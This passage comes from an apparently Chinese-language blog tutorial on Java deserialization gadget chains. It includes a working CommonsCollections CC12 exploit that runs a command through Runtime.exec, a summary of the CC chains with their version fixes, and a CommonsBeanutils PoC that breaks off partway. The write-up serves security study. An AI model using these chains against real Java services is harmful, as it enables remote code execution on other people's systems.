<h4 id="å…³é”®ç±»-11"><a href="#å…³é”®ç±»-11" class="headerlink" title="å…³é”®ç±»"></a>å…³é”®ç±»</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ScriptEngineManager</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute">HashSet</span><br></code></pre></td></tr></table></figure>

<h4 id="åˆ©ç”¨é“¾-11"><a href="#åˆ©ç”¨é“¾-11" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashSet</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>get<span class="hljs-constructor">Value()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">                    ...</span><br><span class="hljs-operator">                    </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                    	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ScriptEngineManager</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                    	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ScriptEngineManager</span>.</span></span>gey<span class="hljs-constructor">EngineByName()</span><br>                    		<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">NashornScriptEngine</span>.</span></span>eval<span class="hljs-literal">()</span><br>                    			<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">NashornScriptEngine</span>.</span></span>eval<span class="hljs-constructor">Impl()</span><br>                   			 		<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>

<h3 id="Gadget-11"><a href="#Gadget-11" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC12;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> javax.script.ScriptEngineManager;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC12</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(ScriptEngineManager.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newInstance&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getEngineByName&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;JavaScript&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br><br>        HashSet hs = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);<br>        hs.add(<span class="hljs-string">&quot;c&quot;</span>);<br><br>        Field mapF = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        mapF.setAccessible(<span class="hljs-keyword">true</span>);<br>        HashMap hm_tmp = (HashMap) mapF.get(hs);<br><br>        Field tableF = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        tableF.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] arr = (Object[]) tableF.get(hm_tmp);<br><br>        Object node = arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-keyword">null</span>) &#123;<br>            node = arr[<span class="hljs-number">1</span>];<br>        &#125;<br><br>        Field keyF = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        keyF.setAccessible(<span class="hljs-keyword">true</span>);<br>        keyF.set(node, tiedMapEntry);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(hs);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CC-æ€»ç»“"><a href="#CC-æ€»ç»“" class="headerlink" title="CC æ€»ç»“"></a>CC æ€»ç»“</h2><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/f9bee6c5293b753f2421c47eb8cfb7e38.png" srcset="/img/loading.gif" lazyload></p>
<p><code>CommonsCollections&lt;=3.2.1</code>ä¸‹çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾çš„æ€»ç»“ï¼š</p>
<ul>
<li>èµ·å§‹ç‚¹<ol>
<li><code>AnnotationInvocationHandler</code>çš„<code>readObject</code></li>
<li><code>BadAttributeValueExpException</code>çš„<code>readObject</code></li>
<li><code>HashSet</code>çš„<code>readObject</code></li>
<li><code>Hashtable</code>çš„<code>readObject</code></li>
</ol>
</li>
<li>é‡è¦çš„æ‰¿æ¥ç‚¹<ol>
<li><code>LazyMap</code>çš„<code>get</code></li>
<li><code>DefaultedMap</code>çš„<code>get</code></li>
<li><code>TiedMapEntry</code>çš„<code>getValue</code></li>
<li><code>Proxy</code>çš„<code>invoke</code></li>
</ol>
</li>
<li>ç»ˆç‚¹<ol>
<li><code>ChainedTransformer</code>çš„<code>transform</code></li>
<li><code>InvokerTransformer</code>çš„<code>transform</code></li>
<li><code>ConstantTransformer</code>çš„<code>transform</code></li>
</ol>
</li>
</ul>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">å„expçš„<span class="hljs-keyword">jdké€‚ç”¨ç‰ˆæœ¬</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword">jdk7 </span>&gt;= CommonsCollections <span class="hljs-number">1</span>ã€<span class="hljs-number">3</span><br><span class="hljs-keyword">jdk7 </span>&amp; <span class="hljs-keyword">jdk8 </span>&gt;= CommonsCollections <span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span><br><br>å„expçš„commons-collectionsé€‚ç”¨ç‰ˆæœ¬<br><br>commons-collections &lt;= <span class="hljs-number">3</span>.<span class="hljs-number">1</span> CommonsCollections <span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">10</span><br>commons-collections &lt;= <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span> CommonsCollections <span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure>

<h3 id="ç‰ˆæœ¬æ›´æ–°"><a href="#ç‰ˆæœ¬æ›´æ–°" class="headerlink" title="ç‰ˆæœ¬æ›´æ–°"></a>ç‰ˆæœ¬æ›´æ–°</h3><p>Commons-Collections 4.0 å’Œ Commons-Collections 3.2.1 æ˜¯ä¸¤ä¸ªä¸åŒçš„åˆ†æ”¯</p>
<ul>
<li><p>commons-collections:commons-collections</p>
</li>
<li><p>org.apache.commons:commons-collections4</p>
</li>
</ul>
<p>Commons-Collections 4 æ˜¯å®˜æ–¹ä¸ºäº†è°ƒæ•´æ¶æ„å’Œ API è®¾è®¡ä¸Šçš„é—®é¢˜æ¨å‡ºçš„é¡¹ç›®ï¼Œä¸èƒ½ç”¨æ¥æ›¿æ¢ Commons-Collections</p>
<p>å¯¹äº CC1 å’Œ CC3ï¼Œå¦‚æœä¾èµ–æ˜¯ Commons-Collections 4.0ï¼Œ<code>LazyMap.decorate</code>éœ€è¦æ›´æ¢ä¸º<code>LazyMap.lazyMap</code></p>
<p>å¯¹äº Commons-Collections 3.2.2ï¼Œ<code>readObject</code>å¢åŠ äº†<code>FunctorUtils.checkUnsafeSerialization</code></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/t01eee470f626eda79e.png" srcset="/img/loading.gif" lazyload></p>
<p>UNSAFE_SERIALIZABLE_PROPERTY çš„å€¼é»˜è®¤ä¸º falseï¼Œå¦‚æœéœ€è¦ä¸º trueï¼Œéœ€è¦åœ¨è¿è¡Œæ—¶æŒ‡å®š</p>
<p>ä½¿ç”¨ InvokerTransformer ä½œä¸ºååºåˆ—åŒ–åˆ©ç”¨é“¾çš„ä¸€éƒ¨åˆ†æ—¶ï¼Œä¼š throw ä¸€ä¸ª exception</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">CloneTransformer</span><br><span class="hljs-keyword"></span>ForClosure<br><span class="hljs-keyword">InstantiateFactory</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">InstantiateTransformer</span><br><span class="hljs-keyword"></span>InvokerTransformer<br>PrototypeCloneFactory<br>PrototypeSerializationFactory<br>WhileClosure<br></code></pre></td></tr></table></figure>

<p>è€Œ 4.1 çš„ä¿®å¤æ–¹å¼ï¼Œå±é™©çš„<code>Transformer</code>ä¸å†å®ç°<code>Serializable</code>æ¥å£</p>
<h2 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h2><p>Apache Commons Beanutils æ˜¯ Apache Commons å·¥å…·é›†ä¸‹çš„å¦ä¸€ä¸ªé¡¹ç›®ï¼Œå®ƒæä¾›äº†å¯¹æ™®é€š Java ç±»å¯¹ è±¡ï¼ˆä¹Ÿç§°ä¸º JavaBeanï¼‰çš„ä¸€äº›æ“ä½œæ–¹æ³•ã€‚</p>
<h3 id="Pre-12"><a href="#Pre-12" class="headerlink" title="Pre"></a>Pre</h3><h4 id="é™åˆ¶-12"><a href="#é™åˆ¶-12" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h4><blockquote>
<p>jdk æš‚æ— é™åˆ¶</p>
<p>commons-beanutils</p>
</blockquote>
<h4 id="åˆ©ç”¨é“¾-12"><a href="#åˆ©ç”¨é“¾-12" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>heapify<span class="hljs-literal">()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">Down()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">DownUsingComparator()</span><br>		<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BeanComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br>			<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PropertyUtils</span>.</span></span>get<span class="hljs-constructor">Property()</span><br>				<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">OutputProperties()</span><br>				<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>				<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>					<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>

<h4 id="å…³é”®ç±»-12"><a href="#å…³é”®ç±»-12" class="headerlink" title="å…³é”®ç±»"></a>å…³é”®ç±»</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ClassPool</span><br><span class="hljs-attribute">CtClass</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">AbstractTranslet</span><br><span class="hljs-attribute">TemplatesImpl</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">BeanComparator</span><br><span class="hljs-attribute">PropertyUtils</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">PriorityQueue</span><br></code></pre></td></tr></table></figure>

<h4 id="JavaBean"><a href="#JavaBean" class="headerlink" title="JavaBean"></a>JavaBean</h4><p>ä»€ä¹ˆæ˜¯ JavaBeanï¼Œä¸€ä¸ªç±»ï¼š</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">æ‰€æœ‰å±æ€§ä¸º<span class="hljs-keyword">private</span><br>æä¾›getterå’Œsetterè¯»å–<span class="hljs-keyword">private</span>å±æ€§<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsBeanutils.Beandemo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> id;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getId</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setId</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">(String name, <span class="hljs-keyword">int</span> id)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>        <span class="hljs-keyword">this</span>.id = id;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="PropertyUtils"><a href="#PropertyUtils" class="headerlink" title="PropertyUtils"></a>PropertyUtils</h4><p>common-beanutils æä¾›äº†<code>PropertyUtils.getProperty</code>å¯ä»¥ç›´æ¥è°ƒç”¨ä»»æ„ JavaBean çš„ getter</p>
<blockquote>
<p>Exception in thread â€œmainâ€ java.lang.NoClassDefFoundError: org/apache/commons/logging/LogFactory<br>at org.apache.commons.beanutils.ConvertUtilsBean.<init>(ConvertUtilsBean.java:157)<br>at org.apache.commons.beanutils.BeanUtilsBean.<init>(BeanUtilsBean.java:117)<br>at org.apache.commons.beanutils.BeanUtilsBean$1.initialValue(BeanUtilsBean.java:68)<br>    at org.apache.commons.beanutils.ContextClassLoaderLocal.get(ContextClassLoaderLocal.java:153)<br>    at org.apache.commons.beanutils.BeanUtilsBean.getInstance(BeanUtilsBean.java:80)<br>    at org.apache.commons.beanutils.PropertyUtilsBean.getInstance(PropertyUtilsBean.java:114)<br>    at org.apache.commons.beanutils.PropertyUtils.getProperty(PropertyUtils.java:426)<br>    at CommonsBeanutils.Beandemo.Demo.main(Demo.java:9)<br>Caused by: java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactory<br>    at java.net.URLClassLoader.findClass(URLClassLoader.java:381)<br>    at java.lang.ClassLoader.loadClass(ClassLoader.java:424)<br>    at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:331)<br>at java.lang.ClassLoader.loadClass(ClassLoader.java:357)<br>â€¦ 8 more</p>
</blockquote>
<p>åœ¨ pom.xml æ·»åŠ ä¾èµ–</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsBeanutils.Beandemo;<br><br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException </span>&#123;<br>        User user = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-number">1</span>);<br>        System.out.println(PropertyUtils.getProperty(user, <span class="hljs-string">&quot;name&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>çºµè§‚ä½¿ç”¨åˆ°äº†<code>TemplatesImpl</code>çš„é“¾ï¼Œéƒ½æ˜¯è°ƒç”¨äº†<code>TemplatesImpl.newTransformer</code>æˆ–è€…<code>TemplatesImpl.getOutputProperties</code>ï¼Œä¸¤è€…çš„ä½œç”¨åŸŸéƒ½æ˜¯ publicï¼›å…¶ä¸­<code>getOutputProperties</code>å†…éƒ¨è°ƒç”¨äº†<code>newTransformer</code></p>
<p>è¿™é‡Œæ³¨æ„åˆ°<code>getOutputProperties</code>æ˜¯ä¸€ä¸ª getterï¼Œ<code>TemplatesImpl</code>æ˜¯ä¸€ä¸ª JavaBean</p>
<p>poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsBeanutils;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><span class="hljs-keyword">import</span> org.apache.commons.lang3.RandomStringUtils;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CB1poc</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException </span>&#123;<br>        Random random = <span class="hljs-keyword">new</span> Random();<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        String suffix = RandomStringUtils.randomAlphabetic(<span class="hljs-number">5</span>);<br>        suffix = 